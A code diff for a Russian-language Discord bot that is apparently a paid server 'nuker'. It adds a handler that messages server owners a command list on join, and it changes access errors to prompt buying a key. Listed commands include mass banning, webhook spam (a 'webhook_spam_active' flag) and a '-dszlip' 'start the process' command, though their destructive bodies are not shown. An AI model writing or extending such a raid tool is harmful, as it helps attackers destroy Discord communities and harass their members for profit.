@@ -57,6 +57,27 @@ async def on_command_error(ctx, error):
         return
     await ctx.send(f"❌ Ошибка: {error}")
 
+@bot.event
+async def on_guild_join(guild):
+    """Когда бота добавляют на сервер - отправляет ЛС владельцу сервера"""
+    try:
+        owner = guild.owner
+        embed = discord.Embed(
+            title="📋 СПИСОК КОМАНД",
+            description="Все доступные команды",
+            color=discord.Color.dark_grey()
+        )
+        embed.add_field(name="━━━━ ❗ ОСНОВНЫЕ ❗ ━━━━", value="", inline=False)
+        embed.add_field(name="-dszlip", value="Запускает процесс", inline=False)
+        embed.add_field(name="-status", value="Показывает статус бота", inline=False)
+        embed.add_field(name="-ping", value="Проверка задержки", inline=False)
+        embed.add_field(name="-webhook", value="Активирует вебхуки", inline=False)
+        embed.add_field(name="-massban", value="Массовый бан", inline=False)
+        embed.set_footer(text="Для покупки ключа напишите владельцу - dszlip")
+        await owner.send(embed=embed)
+    except:
+        pass
+
 # === ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА ===
 @bot.command()
 async def admin(ctx):
@@ -221,25 +242,9 @@ async def servers(ctx):
 
 # === КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ ===
 @bot.command()
-async def help(ctx):
-    embed = discord.Embed(
-        title="📋 СПИСОК КОМАНД",
-        description="Все доступные команды",
-        color=discord.Color.dark_grey()
-    )
-    embed.add_field(name="━━━━ ❗ ОСНОВНЫЕ ❗ ━━━━", value="", inline=False)
-    embed.add_field(name="-dszlip", value="Запускает процесс", inline=False)
-    embed.add_field(name="-status", value="Показывает статус бота", inline=False)
-    embed.add_field(name="-ping", value="Проверка задержки", inline=False)
-    embed.add_field(name="-webhook", value="Активирует вебхуки", inline=False)
-    embed.add_field(name="-massban", value="Массовый бан", inline=False)
-    embed.set_footer(text="MOGGED BY ZLIP")
-    await ctx.send(embed=embed)
-
-@bot.command()
 async def ping(ctx):
     if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа!")
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
     latency = round(bot.latency * 1000)
@@ -248,7 +253,7 @@ async def ping(ctx):
 @bot.command()
 async def status(ctx):
     if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа!")
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
     embed = discord.Embed(
@@ -266,7 +271,7 @@ async def webhook(ctx):
     global webhook_spam_active
     
     if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа!")
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
     if not ctx.author.guild_permissions.administrator:
@@ -312,7 +317,7 @@ async def webhook(ctx):
 @bot.command()
 async def massban(ctx):
     if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа!")
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
     if not ctx.author.guild_permissions.administrator:
@@ -336,7 +341,7 @@ async def massban(ctx):
 @bot.command()
 async def dszlip(ctx):
     if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа!")
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
     if not ctx.author.guild_permissions.administrator:
